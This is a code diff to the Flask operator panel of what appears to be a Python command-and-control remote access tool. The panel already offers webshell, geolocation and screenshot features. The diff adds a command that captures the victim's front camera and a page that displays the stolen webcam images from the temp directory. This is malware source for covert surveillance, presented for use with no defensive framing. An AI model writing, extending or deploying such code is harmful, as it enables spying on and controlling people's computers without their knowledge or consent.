@@ -79,7 +79,16 @@ def consolee():
                 return redirect(url_for('geo'))
             
             elif command == 'shell':
-                return redirect(url_for('shell'))        
+                return redirect(url_for('shell'))
+
+            elif command == 'grabfrontcam':
+                c2.getfrontcam()
+                message = 'Picture captured successfully'
+                return render_template('result.html', error=error,message=message)
+            
+
+            elif command == 'showfcam':
+                return redirect(url_for('showfcam'))
         return render_template('console.html', error=error,message=message)
 
 
@@ -107,6 +116,19 @@ def showss():
     return render_template('showss.html',ss=ss)
 
 
+@app_instance.route('/showfcam', methods=['GET'])
+def showfcam():
+    if not app_auth.isAuthenticated:
+        return redirect(url_for('index'))
+    pix = []
+    for file in glob.glob(f"{tempfile.gettempdir()}\\*.png"):
+        if os.path.basename(file).startswith('pyc2webcam'):
+            with open(file, 'rb') as img:
+                b64_img = base64.b64encode(img.read())
+                pix.append(b64_img.decode())
+    return render_template('showfcam.html',pix=pix)
+
+
 @app_instance.route('/geo', methods=['GET', 'POST'])
 def geo():
     if not app_auth.isAuthenticated:
@@ -126,6 +148,14 @@ def shell():
     else:
         cmd = ()
         return render_template('webshell.html', cmd=cmd)
+
+@app_instance.errorhandler(404)
+def page_not_found(e):
+    return render_template('404.html'), 404
+
+@app_instance.errorhandler(500)
+def page_not_found(e):
+    return render_template('500.html'), 500
 
 
 if __name__ == '__main__':
